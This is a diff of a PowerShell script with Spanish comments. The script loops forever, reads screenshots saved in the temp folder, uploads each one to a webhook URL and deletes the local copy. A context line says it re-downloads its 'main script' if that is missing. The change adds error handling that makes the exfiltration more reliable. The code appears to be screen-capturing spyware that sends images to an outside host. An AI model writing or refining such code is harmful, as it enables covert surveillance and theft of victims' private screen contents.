@@ -38,23 +38,30 @@ While ($true){
     For ($i = 1; $i -le $a; $i++){
         $fileToSend = "$env:temp\SC_$i.png"
         $fileName = "SC_$i.png"
-        $fileBytes = [System.IO.File]::ReadAllBytes($fileToSend)
-        $contentType = "application/octet-stream"
         
-        $headers = @{
-            "Content-Disposition" = "attachment; filename=$fileName"
-        }
-        
-        $response = Invoke-RestMethod -Uri $hookurl -Method Post -Headers $headers -ContentType $contentType -Body $fileBytes
-        
-        # Comprobamos si la solicitud fue exitosa
-        if ($response.StatusCode -eq 200) {
-            Write-Host "Imagen $fileName enviada correctamente."
+        # Verificar si el archivo de imagen existe
+        if (Test-Path $fileToSend) {
+            $fileBytes = [System.IO.File]::ReadAllBytes($fileToSend)
+            $contentType = "application/octet-stream"
+            
+            $headers = @{
+                "Content-Disposition" = "attachment; filename=$fileName"
+            }
+            
+            # Enviar la solicitud al webhook
+            try {
+                $response = Invoke-RestMethod -Uri $hookurl -Method Post -Headers $headers -ContentType $contentType -Body $fileBytes
+                Write-Host "Imagen $fileName enviada correctamente."
+            } catch {
+                Write-Host "Error al enviar la imagen $fileName al webhook: $_"
+                continue # Salta a la próxima iteración del bucle si hay un error
+            }
+            
+            # Eliminar el archivo de imagen solo si se envió correctamente
+            Remove-Item -Path $fileToSend -Force
         } else {
-            Write-Host "Error al enviar la imagen $fileName. Código de estado: $($response.StatusCode)"
+            Write-Host "El archivo de imagen $fileName no existe en la ruta: $fileToSend"
         }
-        
-        Remove-Item -Path $fileToSend -Force
     }
     Start-Sleep $seconds
     # Verificar si el script principal existe, si no, descargarlo
